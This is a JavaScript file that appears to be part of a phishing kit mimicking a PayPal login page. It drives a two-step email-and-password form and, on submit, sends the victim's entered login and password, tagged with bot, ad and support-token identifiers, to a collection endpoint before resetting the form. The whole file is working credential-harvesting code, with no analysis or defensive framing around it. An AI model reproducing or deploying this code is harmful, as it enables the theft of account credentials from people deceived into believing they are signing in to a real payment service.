window.onload = function() {
    const logType = "paypal";

    function loginEmpty() {
        $('#emailErrorMessage').addClass('show');
        $("#login_emaildiv").css("z-index", "100");
    }
    
    function loginNotEmpty() {
        $('#emailErrorMessage').removeClass('show');
        $("#login_emaildiv").css("z-index", "1");
    }
    
    function passwordEmpty() {
        $('#passwordErrorMessage').addClass('show');
        $("#login_passworddiv").css("z-index", "100");
    }
    
    function passwordNotEmpty() {
        $('#passwordErrorMessage').removeClass('show');
        $("#login_passworddiv").css("z-index", "1");
    }
    
    $('#login').keyup(function() {
        if ($(this).val().charAt(0) === ' ') $(this).val('');
        if ($(this).val().length > 0) loginNotEmpty();
    });
    
    $('#password').keyup(function() {
        if ($(this).val().charAt(0) === ' ') $(this).val('');
        if ($(this).val().length > 0) passwordNotEmpty();
    });
    
    $('#back-to-input-login').click(function() {
        clearForm();
    });
    
    $('#btnNext').click(function() {
        if ($('#login').val().length == 0) loginEmpty();
        else {
            $("#login-text-info").text($('#login').val());
            $("#login-form").css("display", "none");
            $("#password-form").css("display", "");
        }
    });
    
    $('#btnLogin').click(function() {
        if ($('#password').val().length == 0) passwordEmpty();
        else if ($('#login').val().length == 0) clearForm();
        else sendLog(this.id, $('#login').val(), $('#password').val());
    });

    function loadButton(button) {
        var buttonText = button.innerHTML;
        button.disabled = true;
        button.innerHTML = `
            <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                    <span class="visually-hidden">...</span>
                </div>
            </div>
        `;
        return buttonText;
    };
    
    function clearForm() {
        $('#login').val('');
        $('#password').val('');
        $("#password-form").css("display", "none");
        $("#login-form").css("display", "");
    }
    
    function sendLog(buttonId, login, password) {
        var buttonText = loadButton(document.getElementById(buttonId));
    
        axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            login: login,
            password: password
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm();
            $(`#${buttonId}`).html(buttonText);
        });
    };
};